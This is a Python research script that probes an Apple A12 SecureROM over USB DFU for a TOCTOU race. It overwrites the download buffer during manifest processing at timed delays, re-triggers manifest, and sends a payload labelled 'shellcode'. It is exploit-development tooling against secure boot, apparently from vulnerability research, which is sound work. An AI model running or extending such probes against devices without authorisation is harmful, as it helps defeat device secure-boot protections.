#!/usr/bin/env python3
"""
A12 SecureROM — Focused TOCTOU + Race Test (v2)
=================================================
Previous test failed because to_idle() was flaky.
This version is more robust and focused.

KEY FINDINGS SO FAR:
  - DNLOAD accepted during manifest (state 6/7) → lands in state 5
  - USB Attack Suite showed race DNLOAD during manifest = OK
  - This means we can overwrite the buffer WHILE it's being parsed

TESTS:
  1. Manifest state machine mapping (all sizes)
  2. TOCTOU: manifest(2048B) → overwrite during processing
  3. Timing measurement of the race window
"""
import time, json, struct, statistics
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
be = lambda: usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

class DFU:
    def __init__(self):
        self.dev = None

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def ctrl(self, rt, req, val, idx, d, timeout=5000):
        return self.dev.ctrl_transfer(rt, req, val, idx, d, timeout=timeout)

    def get_status(self):
        """Returns (state, bStatus, poll_ms) or None"""
        try:
            r = self.ctrl(0xA1, 3, 0, 0, 6)
            return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r)>=6 else None
        except: return None

    def get_state_only(self):
        """GET_STATE — just state byte, faster than GET_STATUS"""
        try:
            r = self.ctrl(0xA1, 5, 0, 0, 1)
            return r[0] if r else None
        except: return None

    def dnload(self, data, timeout=5000):
        try:
            self.ctrl(0x21, 1, 0, 0, data, timeout=timeout)
            return True
        except: return False

    def abort(self):
        try: self.ctrl(0x21, 6, 0, 0, 0); return True
        except: return False

    def clr_status(self):
        try: self.ctrl(0x21, 4, 0, 0, 0); return True
        except: return False

    def reset_to_idle(self):
        """Robust reset to dfuIDLE (state 2)"""
        for attempt in range(30):
            s = self.get_status()
            if not s:
                time.sleep(0.2)
                self.connect()
                continue
            
            state = s[0]
            if state == 2:  # dfuIDLE
                return True
            elif state == 10:  # dfuERROR
                self.clr_status()
            elif state == 5:  # dfuDNLOAD-IDLE
                self.abort()
            elif state in (6, 7):  # dfuMANIFEST-SYNC, dfuMANIFEST
                # Need to let manifest complete or abort
                self.abort()
            elif state == 8:  # dfuMANIFEST-WAIT-RESET
                try: self.dev.reset()
                except: pass
                time.sleep(2)
                self.connect()
            elif state == 3:  # dfuDNLOAD-SYNC  
                self.abort()
            elif state == 4:  # dfuDNLOAD-BUSY
                time.sleep(s[2]/1000.0 + 0.05)
                # After busy, should transition — get status again
                self.get_status()
                self.abort()
            else:
                self.abort()
            time.sleep(0.05)
        return False

    def alive(self):
        try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be()) is not None
        except: return False

    def wait_device(self, timeout=10):
        t0 = time.time()
        while time.time() - t0 < timeout:
            if self.alive():
                self.connect()
                return True
            time.sleep(0.3)
        return False


def run():
    d = DFU()
    log("="*60)
    log("A12 — TOCTOU + Race Test v2")
    log("="*60)

    if not d.connect():
        log("NO DFU DEVICE"); return

    # Quick sanity
    s = d.get_status()
    log(f"Initial state: {s}")
    
    results = {"timestamp": datetime.now().isoformat()}

    # ===========================================================
    # Test 1: State machine mapping — what state after DNLOAD?
    # ===========================================================
    log("\n=== Test 1: State After DNLOAD (various sizes) ===")
    
    state_map = []
    for size in [0, 1, 4, 8, 15, 16, 32, 64, 256, 1024, 2048]:
        if not d.reset_to_idle():
            log(f"  {size}B: can't get to idle")
            d.wait_device(); d.reset_to_idle()
            continue

        payload = bytes(size)
        ok = d.dnload(payload)
        
        # GET_STATUS right after DNLOAD
        s = d.get_status()
        state1 = s[0] if s else None
        bstatus1 = s[1] if s else None
        poll1 = s[2] if s else None
        
        # If in state 5 (DNLOAD-IDLE), try zero-length to trigger manifest
        manifest_entry = None
        if state1 == 5:
            d.dnload(b"")
            s2 = d.get_status()
            manifest_entry = s2[0] if s2 else None

        state_map.append({
            "size": size,
            "dnload_ok": ok,
            "state_after_dnload": state1,
            "bstatus": bstatus1,
            "poll_ms": poll1,
            "manifest_entry": manifest_entry,
        })
        
        log(f"  {size:5d}B: dnload={'OK' if ok else 'FAIL'} state={state1} "
            f"bstatus={bstatus1} poll={poll1} "
            f"{'→ manifest_entry=' + str(manifest_entry) if manifest_entry else ''}")
    
    results["state_map"] = state_map

    # ===========================================================
    # Test 2: Manifest processing window — rapid polling
    # ===========================================================
    log("\n=== Test 2: Manifest Processing Window ===")
    
    window_results = []
    for desc, payload in [("2048B_zeros", bytes(2048)), 
                          ("2048B_img4", b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))]:
        if not d.reset_to_idle():
            d.wait_device(); d.reset_to_idle()

        # DNLOAD
        d.dnload(payload)
        s = d.get_status()
        if not s or s[0] != 5:
            log(f"  {desc}: not in state 5, got {s}")
            continue
        
        # Zero-length → trigger manifest
        d.dnload(b"")
        
        # NOW: rapid GET_STATUS polling to track state transitions
        t0 = time.perf_counter_ns()
        polls = []
        for i in range(100):
            s = d.get_status()
            t = (time.perf_counter_ns() - t0) / 1000
            if not s: break
            polls.append({"i": i, "s": s[0], "b": s[1], "p": s[2], "us": round(t)})
            if s[0] in (2, 10): break  # terminal
        
        # Show transitions
        transitions = []
        prev = None
        for p in polls:
            if p["s"] != prev:
                transitions.append(p)
                prev = p["s"]
        
        window_results.append({
            "desc": desc,
            "n_polls": len(polls),
            "transitions": transitions,
        })
        
        log(f"  {desc}: {len(polls)} polls")
        for t in transitions:
            log(f"    state={t['s']} at {t['us']}us (bstatus={t['b']} poll={t['p']}ms)")
    
    results["manifest_window"] = window_results

    # ===========================================================
    # Test 3: TOCTOU — DNLOAD during manifest
    # ===========================================================
    log("\n=== Test 3: TOCTOU — DNLOAD During Manifest ===")
    
    toctou_results = []
    
    initial_payload = bytes(2048)  # start with zeros
    overwrite_payload = b"\xDE\xAD\xBE\xEF" * 512  # 2048B recognizable pattern
    
    for delay_us in [0, 100, 500, 1000, 1500, 2000, 3000, 5000]:
        if not d.reset_to_idle():
            d.wait_device(); d.reset_to_idle()
        
        # Start manifest
        d.dnload(initial_payload)
        s = d.get_status()
        if not s or s[0] != 5:
            log(f"  delay={delay_us}: state {s[0] if s else 'X'}, skipping")
            continue
        
        d.dnload(b"")  # zero-len → manifest
        
        # First GET_STATUS to enter manifest processing
        t0 = time.perf_counter_ns()
        s = d.get_status()
        entry_state = s[0] if s else None
        entry_us = (time.perf_counter_ns() - t0) / 1000
        
        # Busy-wait for precise delay
        if delay_us > 0:
            target = time.perf_counter_ns() + delay_us * 1000
            while time.perf_counter_ns() < target: pass
        
        actual_delay = (time.perf_counter_ns() - t0) / 1000 - entry_us
        
        # OVERWRITE attempt
        t_ow = time.perf_counter_ns()
        ow_ok = d.dnload(overwrite_payload)
        ow_us = (time.perf_counter_ns() - t_ow) / 1000
        
        # Check what happened
        s = d.get_status()
        after_state = s[0] if s else None
        alive = d.alive()
        
        toctou_results.append({
            "delay_us": delay_us,
            "actual_delay_us": round(actual_delay),
            "entry_state": entry_state,
            "overwrite_ok": ow_ok,
            "overwrite_us": round(ow_us),
            "after_state": after_state,
            "alive": alive,
        })
        
        crashed = not alive
        log(f"  delay={delay_us:5d}us: entry={entry_state} ow={'OK' if ow_ok else 'FAIL'} "
            f"ow_time={ow_us:.0f}us after={after_state} "
            f"{'>>> CRASH!' if crashed else 'alive'}")
        
        if crashed:
            log("  !!! DEVICE CRASHED !!!")
            d.wait_device()
    
    results["toctou"] = toctou_results

    # ===========================================================
    # Test 4: Double manifest — trigger manifest, overwrite, 
    # then trigger manifest AGAIN
    # ===========================================================
    log("\n=== Test 4: Double Manifest (overwrite + re-manifest) ===")
    
    double_results = []
    
    for desc, initial, overwrite in [
        ("zeros→img4", bytes(2048), b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
        ("img4→zeros", b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038), bytes(2048)),
        ("zeros→shellcode", bytes(2048), b"\x00\x00\x80\xD2\xC0\x03\x5F\xD6" * 256),
    ]:
        if not d.reset_to_idle():
            d.wait_device(); d.reset_to_idle()
        
        # First manifest
        d.dnload(initial)
        s = d.get_status()
        if not s or s[0] != 5: continue
        
        d.dnload(b"")  # trigger manifest
        s = d.get_status()  # enter manifest
        
        # Overwrite during manifest
        ow_ok = d.dnload(overwrite)
        s = d.get_status()
        state_after_ow = s[0] if s else None
        
        # If device went to DNLOAD-IDLE (5), trigger manifest again
        manifest2_ok = False
        manifest2_state = None
        if state_after_ow == 5:
            d.dnload(b"")  # trigger 2nd manifest
            s = d.get_status()
            manifest2_state = s[0] if s else None
            manifest2_ok = True
            
            # Poll manifest to completion
            for _ in range(100):
                if not s or s[0] in (2, 8, 10): break
                if s[0] == 4: time.sleep(s[2]/1000)
                s = d.get_status()
            
            final_state = s[0] if s else None
        else:
            final_state = state_after_ow
        
        alive = d.alive()
        
        double_results.append({
            "desc": desc,
            "ow_ok": ow_ok,
            "state_after_ow": state_after_ow,
            "manifest2_ok": manifest2_ok,
            "manifest2_state": manifest2_state,
            "final_state": final_state,
            "alive": alive,
        })
        
        log(f"  {desc:20s}: ow={'OK' if ow_ok else 'FAIL'} "
            f"after_ow={state_after_ow} m2={manifest2_state} "
            f"final={final_state} alive={alive}")
        
        if not alive:
            d.wait_device()
    
    results["double_manifest"] = double_results

    # ===========================================================
    # Test 5: Measure exact TOCTOU race - overwrite with timing
    # ===========================================================
    log("\n=== Test 5: Is overwrite processed by manifest? ===")
    log("  Manifest(payload_A) → overwrite(payload_B) → measure manifest timing")
    log("  If timing changes → overwrite was processed!")
    
    timing_results = []
    
    # Baseline: normal manifest of zeros
    base_times = []
    for _ in range(5):
        if not d.reset_to_idle(): d.wait_device(); d.reset_to_idle()
        d.dnload(bytes(2048))
        d.get_status()
        d.dnload(b"")
        t0 = time.perf_counter_ns()
        s = d.get_status()
        for _ in range(100):
            if not s or s[0] in (2, 8, 10): break
            s = d.get_status()
        dt = (time.perf_counter_ns() - t0) / 1000
        base_times.append(dt)
    
    base_med = statistics.median(base_times) if base_times else 0
    log(f"  Baseline (zeros, no overwrite): {base_med:.0f}us")
    timing_results.append({"desc": "baseline_zeros", "median_us": round(base_med),
                           "raw": [round(t) for t in base_times]})
    
    # With immediate overwrite of IMG4
    ow_times = []
    for _ in range(5):
        if not d.reset_to_idle(): d.wait_device(); d.reset_to_idle()
        d.dnload(bytes(2048))
        d.get_status()
        d.dnload(b"")
        d.get_status()  # enter manifest
        # Immediate overwrite with valid IMG4  
        d.dnload(b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))
        # Now this DNLOAD resets to DNLOAD-IDLE → trigger manifest of IMG4
        s = d.get_status()
        if s and s[0] == 5:
            d.dnload(b"")
            t0 = time.perf_counter_ns()
            s = d.get_status()
            for _ in range(100):
                if not s or s[0] in (2, 8, 10): break
                s = d.get_status()
            dt = (time.perf_counter_ns() - t0) / 1000
            ow_times.append(dt)
    
    ow_med = statistics.median(ow_times) if ow_times else 0
    log(f"  Overwrite (zeros→IMG4): {ow_med:.0f}us")
    timing_results.append({"desc": "overwrite_zeros_to_img4", "median_us": round(ow_med),
                           "raw": [round(t) for t in ow_times]})
    
    # Normal IMG4 manifest (no race)
    img4_times = []
    for _ in range(5):
        if not d.reset_to_idle(): d.wait_device(); d.reset_to_idle()
        d.dnload(b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))
        d.get_status()
        d.dnload(b"")
        t0 = time.perf_counter_ns()
        s = d.get_status()
        for _ in range(100):
            if not s or s[0] in (2, 8, 10): break
            s = d.get_status()
        dt = (time.perf_counter_ns() - t0) / 1000
        img4_times.append(dt)
    
    img4_med = statistics.median(img4_times) if img4_times else 0
    log(f"  Direct IMG4 (no race): {img4_med:.0f}us")
    timing_results.append({"desc": "direct_img4", "median_us": round(img4_med),
                           "raw": [round(t) for t in img4_times]})
    
    results["timing_race"] = timing_results

    # Save
    outf = Path(__file__).parent / "results" / "toctou_v2.json"
    outf.parent.mkdir(exist_ok=True)
    with open(outf, "w") as f:
        json.dump(results, f, indent=2)
    log(f"\nSaved: {outf}")
    log("DONE")


if __name__ == "__main__":
    run()
